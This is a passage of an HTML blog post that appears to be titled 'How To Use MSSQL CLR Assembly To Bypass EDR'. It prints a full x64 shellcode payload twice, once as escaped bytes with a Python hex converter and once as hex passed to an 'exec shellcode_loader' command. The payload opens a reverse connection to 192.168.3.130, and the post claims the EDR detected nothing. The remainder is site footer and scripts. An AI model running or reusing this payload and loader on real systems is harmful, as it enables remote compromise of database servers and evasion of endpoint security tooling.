class="line">x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x</span><br><span class="line">0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5</span><br><span class="line">e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a</span><br><span class="line">\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\</span><br><span class="line">x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x</span><br><span class="line">48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd</span><br><span class="line">5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x4b\x1f\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a</span><br><span class="line">\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\</span><br><span class="line">x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\x</span><br><span class="line">ff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc</span><br><span class="line">0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f</span><br><span class="line">\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\</span><br><span class="line">x00\xe8\xa2\xff\xff\xff\x2f\x52\x4e\x50\x6d\x00\xa4\xc1\x12\x2f\x52\x7f\xda\xdb\x</span><br><span class="line">19\x11\x20\x16\x2f\x85\xc8\x97\x87\xd4\xc7\xfc\x3f\x20\xb2\xc9\xed\x23\x14\x12\x0</span><br><span class="line">2\x8c\x22\xcb\x04\x9c\xd3\x02\x2c\x42\x0e\xf2\xb6\x17\x2a\x11\x9d\x7b\x2e\xe0\x1b</span><br><span class="line">\x52\x05\xc6\x53\x86\xca\x1e\xb6\x2c\xa0\xb2\x3d\x13\x89\x5e\x93\xf1\x03\x3b\xa5\</span><br><span class="line">xf9\xce\xa4\xc8\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x</span><br><span class="line">69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3</span><br><span class="line">b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e</span><br><span class="line">\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\</span><br><span class="line">x74\x2f\x35\x2e\x30\x3b\x20\x4d\x41\x54\x50\x3b\x20\x4d\x41\x54\x50\x29\x0d\x0a\x</span><br><span class="line">00\x90\x43\x13\x5b\x13\x34\x7d\x9f\x7e\x65\x68\x85\xfa\x95\xa8\xb8\xfc\x36\xec\x7</span><br><span class="line">5\x24\x1d\x8f\xc5\xa4\xc7\x06\x55\x35\xf6\x14\x82\x31\x46\x25\x94\x14\x70\x7e\x49</span><br><span class="line">\x9c\x0b\x3e\xef\x29\x03\xcc\x77\x72\x23\xdc\xf9\x9d\x8e\x93\x6a\xef\x36\x76\xa3\</span><br><span class="line">x63\x60\xe8\x60\xb6\x8f\x08\x48\xb4\x0c\xa5\x03\x44\x0a\x4c\xb1\x36\x99\xe6\xe0\x</span><br><span class="line">3c\xc7\xcc\x05\x74\x18\x49\x1a\x61\x39\xd9\x58\xe0\xbd\xdd\x74\x3a\x24\xe6\x91\xa</span><br><span class="line">4\xfd\x70\xcc\xd2\xcf\x20\x76\x63\x47\xe1\x5b\x32\x34\x87\x05\x13\x6e\x4d\xd7\x21</span><br><span class="line">\x29\xdc\xf6\x5b\x4a\x05\x72\xdf\xfb\xe7\xd6\x27\x04\x6a\x18\xc8\x8d\x55\x49\x43\</span><br><span class="line">xae\xe8\x46\x85\x35\x43\x0a\x1f\x83\x04\x20\xba\x10\x97\xe4\x36\x3a\x0a\xac\x77\x</span><br><span class="line">07\x42\x86\x17\x73\x53\x73\x3f\x0e\x0b\x5a\xd0\x6a\x03\xd6\x39\x59\xaf\x8f\xa1\x5</span><br><span class="line">1\xa3\xb8\x45\xa1\x82\x26\x0e\x9d\xa7\x01\xe7\x76\x5e\x42\xb9\x4b\x14\x4c\xc8\x27</span><br><span class="line">\xec\x8b\x7a\x58\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\</span><br><span class="line">x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\x</span><br><span class="line">d5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x4</span><br><span class="line">9\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b</span><br><span class="line">\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\</span><br><span class="line">x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x33\x2e\x31\x33\x30\x00\x3a\xde\x</span><br><span class="line">68\xb1&#x27;</span><br><span class="line">   convert_string = &#x27;&#x27;.join(format(byte, &#x27;02x&#x27;) for byte in byte_sequence)</span><br><span class="line">   print(convert_string)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    hex_convert()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pasted-327.png" alt="upload successful"></p>
+<p>Load and execute ShellCode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">exec shellcode_loader</span><br><span class="line">&#x27;fc4883e4f0e8c8000000415141505251564831d265488b5260488b5218488b5220488b7250480fb7</span><br><span class="line">4a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d06681781</span><br><span class="line">80b0275728b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801</span><br><span class="line">d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0</span><br><span class="line">c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a</span><br><span class="line">488b12e94fffffff5d6a0049be77696e696e65740041564989e64c89f141ba4c772607ffd54831c94</span><br><span class="line">831d24d31c04d31c94150415041ba3a5679a7ffd5eb735a4889c141b84b1f00004d31c9415141516a</span><br><span class="line">03415141ba57899fc6ffd5eb595b4889c14831d24989d84d31c9526800024084525241baeb552e3bf</span><br><span class="line">fd54889c64883c3506a0a5f4889f14889da49c7c0ffffffff4d31c9525241ba2d06187bffd585c00f</span><br><span class="line">859d01000048ffcf0f848c010000ebd3e9e4010000e8a2ffffff2f524e506d00a4c1122f527fdadb1</span><br><span class="line">91120162f85c89787d4c7fc3f20b2c9ed231412028c22cb049cd3022c420ef2b6172a119d7b2ee01b</span><br><span class="line">5205c65386ca1eb62ca0b23d13895e93f1033ba5f9cea4c800557365722d4167656e743a204d6f7a6</span><br><span class="line">96c6c612f352e302028636f6d70617469626c653b204d53494520392e303b2057696e646f7773204e</span><br><span class="line">5420362e313b20574f5736343b2054726964656e742f352e303b204d4154503b204d415450290d0a0</span><br><span class="line">09043135b13347d9f7e656885fa95a8b8fc36ec75241d8fc5a4c7065535f614823146259414707e49</span><br><span class="line">9c0b3eef2903cc777223dcf99d8e936aef3676a36360e860b68f0848b40ca503440a4cb13699e6e03</span><br><span class="line">cc7cc057418491a6139d958e0bddd743a24e691a4fd70ccd2cf20766347e15b32348705136e4dd721</span><br><span class="line">29dcf65b4a0572dffbe7d627046a18c88d554943aee8468535430a1f830420ba1097e4363a0aac770</span><br><span class="line">74286177353733f0e0b5ad06a03d63959af8fa151a3b845a182260e9da701e7765e42b94b144cc827</span><br><span class="line">ec8b7a580041bef0b5a256ffd54831c9ba0000400041b80010000041b94000000041ba58a453e5ffd</span><br><span class="line">5489353534889e74889f14889da41b8002000004989f941ba129689e2ffd54883c42085c074b6668b</span><br><span class="line">074801c385c075d758585848050000000050c3e89ffdffff3139322e3136382e332e313330003ade6</span><br><span class="line">8b1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>The MSSQL is listened successfully， the EDR could not find any abnormal behavior</p>
+<p><img src="/images/pasted-329.png" alt="upload successful"></p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Background"><span class="toc-number">1.</span> <span class="toc-text">Background</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-CLR"><span class="toc-number">2.</span> <span class="toc-text">What is CLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Compile-CLR-Assembly"><span class="toc-number">3.</span> <span class="toc-text">Compile CLR Assembly</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://pyn3rd.github.io/2024/11/22/How-to-use-MSSQL-CLR-assembly-to-bypass-EDR/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://pyn3rd.github.io/2024/11/22/How-to-use-MSSQL-CLR-assembly-to-bypass-EDR/&text=How To Use MSSQL CLR Assembly To Bypass EDR"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://pyn3rd.github.io/2024/11/22/How-to-use-MSSQL-CLR-assembly-to-bypass-EDR/&title=How To Use MSSQL CLR Assembly To Bypass EDR"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://pyn3rd.github.io/2024/11/22/How-to-use-MSSQL-CLR-assembly-to-bypass-EDR/&is_video=false&description=How To Use MSSQL CLR Assembly To Bypass EDR"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=How To Use MSSQL CLR Assembly To Bypass EDR&body=Check out this article: https://pyn3rd.github.io/2024/11/22/How-to-use-MSSQL-CLR-assembly-to-bypass-EDR/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://pyn3rd.github.io/2024/11/22/How-to-use-MSSQL-CLR-assembly-to-bypass-EDR/&title=How To Use MSSQL CLR Assembly To Bypass EDR"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://pyn3rd.github.io/2024/11/22/How-to-use-MSSQL-CLR-assembly-to-bypass-EDR/&title=How To Use MSSQL CLR Assembly To Bypass EDR"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://pyn3rd.github.io/2024/11/22/How-to-use-MSSQL-CLR-assembly-to-bypass-EDR/&title=How To Use MSSQL CLR Assembly To Bypass EDR"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://pyn3rd.github.io/2024/11/22/How-to-use-MSSQL-CLR-assembly-to-bypass-EDR/&title=How To Use MSSQL CLR Assembly To Bypass EDR"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://pyn3rd.github.io/2024/11/22/How-to-use-MSSQL-CLR-assembly-to-bypass-EDR/&name=How To Use MSSQL CLR Assembly To Bypass EDR&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://pyn3rd.github.io/2024/11/22/How-to-use-MSSQL-CLR-assembly-to-bypass-EDR/&t=How To Use MSSQL CLR Assembly To Bypass EDR"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2016-2024
+        pyn3rd
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">Home</a></li><!--
+        --><!--
+          --><li><a href="/archives/">Archives</a></li><!--
+        --><!--
+          --><li><a href="/search/">Search</a></li><!--
+        --><!--
+          --><li><a href="/about/">About</a></li><!--
+        -->
+          </ul>
+          <ul>
+            
+              <span id="busuanzi_container_site_pv">
+                  Views <span id="busuanzi_value_site_pv"></span>
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                  Visitors <span id="busuanzi_value_site_uv"></span>
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+      
+</footer>
+
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?e6d8a6d6d91254d9108e469862e88709";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'pyn3rd/pyn3rd.github.io';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
